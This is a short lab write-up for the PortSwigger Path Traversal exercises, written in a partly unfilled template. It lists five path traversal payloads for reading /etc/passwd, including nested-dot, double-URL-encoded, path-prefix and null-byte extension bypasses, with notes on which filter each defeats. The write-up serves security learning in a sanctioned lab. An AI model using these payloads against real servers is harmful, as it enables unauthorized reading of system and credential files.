\\# PortSwigger — PathTraversal



\\\*\\\*Date:\\\*\\\* 2025-09-20  



\\\*\\\*Platform:\\\*\\\* Portswigger    



\\\*\\\*Difficulty:\\\*\\\* Easy 



\\\*\\\*Time Spent:\\\*\\\* <e.g.  45m>   



---







\\## Summary / Objective



This is a walkthrough for the portswigger room \\\*\\\*Path Traversal\\\*\\\*. The objective was to enumerate the different websites for path traversal vuln and exploit them and get file /etc/passwd . All testing was performed in the portswigger controlled environment and follows the platform rules.







---







\\## Scope \\\& Rules



\\- Platform: portswigger — lab environment provided by platform.  



\\- Allowed: attacking the assigned machine(s) only, no external attacks.  



\\- Not allowed: any testing outside the lab environment (not performed).







---







\\## Target



\\- IP: `not needed in attack`  



\\- Notes: Vm is a beginner-friendly box focusing on web enumeration and basic privilege escalation.







---







\\## Tools \\\& Methodology



Tools used :  `burpsuite`



Methodology: follow a structured approach — reconnaissance → enumeration → exploitation (proof-of-concept) → post-exploitation → cleanup.







---







\\## Enumeration







\\### 1) Port scan



Command used: Used Different type of commands to access /etc/passwd

../../../etc/passwd --> simple

....//....//....//etc/passwd --> mixed

..%252f..%252f..%252fetc/passwd --> double url encode path some website only encode one time and ignore afterward 

/var/www/images/../../../etc/passwd --> some websites check for file path 

%2f..%2f..%2f..%2fetc%2fpasswd%00.jpg --> some websites check for the reqiued file exetantion but %00 --> null char ignore the .jpg and show us main content   



